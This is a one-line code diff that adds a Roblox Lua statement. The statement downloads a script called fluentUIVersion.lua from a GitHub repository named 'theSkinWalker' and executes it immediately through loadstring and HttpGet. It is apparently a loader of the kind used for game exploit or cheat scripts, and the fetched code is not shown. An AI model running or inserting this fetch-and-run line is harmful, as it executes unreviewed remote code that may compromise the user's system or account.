@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jogosutora/theSkinWalker/refs/heads/main/fluentUIVersion.lua"))()
